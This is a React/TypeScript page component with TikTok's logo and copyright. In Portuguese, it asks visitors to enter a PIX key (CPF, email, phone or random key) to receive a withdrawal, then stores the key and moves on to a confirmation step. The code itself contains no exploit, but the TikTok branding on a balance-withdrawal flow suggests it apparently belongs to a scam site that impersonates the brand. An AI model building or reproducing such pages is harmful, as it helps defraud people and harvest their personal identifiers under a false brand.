import { useState } from "react";
import { useNavigate } from "react-router-dom";
import tiktokLogo from "@/assets/tiktok-logo-white.svg";
import { Input } from "@/components/ui/input";

const Add = () => {
  const navigate = useNavigate();
  const [pixKey, setPixKey] = useState("");
  const [keyType, setKeyType] = useState<"cpf" | "email" | "phone" | "random">("cpf");

  const handleContinue = () => {
    if (pixKey.trim()) {
      localStorage.setItem("pixKey", pixKey);
      localStorage.setItem("pixKeyType", keyType);
      navigate("/confirm-wd");
    }
  };

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    return numbers
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .slice(0, 14);
  };

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    return numbers
      .replace(/(\d{2})(\d)/, "($1) $2")
      .replace(/(\d{5})(\d)/, "$1-$2")
      .slice(0, 15);
  };

  const handleInputChange = (value: string) => {
    if (keyType === "cpf") {
      setPixKey(formatCPF(value));
    } else if (keyType === "phone") {
      setPixKey(formatPhone(value));
    } else {
      setPixKey(value);
    }
  };

  const getPlaceholder = () => {
    switch (keyType) {
      case "cpf":
        return "000.000.000-00";
      case "email":
        return "seuemail@exemplo.com";
      case "phone":
        return "(00) 00000-0000";
      case "random":
        return "Chave aleatória";
    }
  };

  return (
    <div className="min-h-screen bg-black flex flex-col">
      {/* Header */}
      <header className="bg-black py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok" className="h-8" />
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 pb-8">
        <div className="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
          <h2 className="text-xl font-semibold text-gray-900 mb-2 text-center">
            Adicionar chave PIX
          </h2>
          <p className="text-gray-500 text-sm text-center mb-6">
            Informe a chave PIX para receber o saque
          </p>

          {/* Key Type Selection */}
          <div className="grid grid-cols-4 gap-2 mb-6">
            {[
              { type: "cpf", label: "CPF" },
              { type: "email", label: "Email" },
              { type: "phone", label: "Celular" },
              { type: "random", label: "Aleatória" },
            ].map((item) => (
              <button
                key={item.type}
                onClick={() => {
                  setKeyType(item.type as typeof keyType);
                  setPixKey("");
                }}
                className={`py-2 px-3 rounded-lg text-sm font-medium transition-all ${
                  keyType === item.type
                    ? "bg-gray-900 text-white"
                    : "bg-gray-100 text-gray-600 hover:bg-gray-200"
                }`}
              >
                {item.label}
              </button>
            ))}
          </div>

          {/* Input */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Chave PIX ({keyType.toUpperCase()})
            </label>
            <Input
              type={keyType === "email" ? "email" : "text"}
              placeholder={getPlaceholder()}
              value={pixKey}
              onChange={(e) => handleInputChange(e.target.value)}
              className="w-full"
            />
          </div>

          {/* Security Info */}
          <div className="flex items-start gap-3 p-4 bg-gray-50 rounded-lg mb-6">
            <svg className="w-5 h-5 text-gray-500 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
            </svg>
            <p className="text-sm text-gray-600">
              Sua chave PIX é protegida e será usada apenas para transferir o saldo para sua conta.
            </p>
          </div>

          {/* CTA Button */}
          <button
            onClick={handleContinue}
            disabled={!pixKey.trim()}
            className={`w-full py-4 rounded-lg font-semibold transition-colors ${
              pixKey.trim()
                ? "bg-gray-900 text-white hover:bg-gray-800"
                : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
          >
            Continuar
          </button>
        </div>

        {/* Footer */}
        <p className="text-gray-500 text-sm mt-8">© 2025 — TikTok</p>
      </main>
    </div>
  );
};

export default Add;
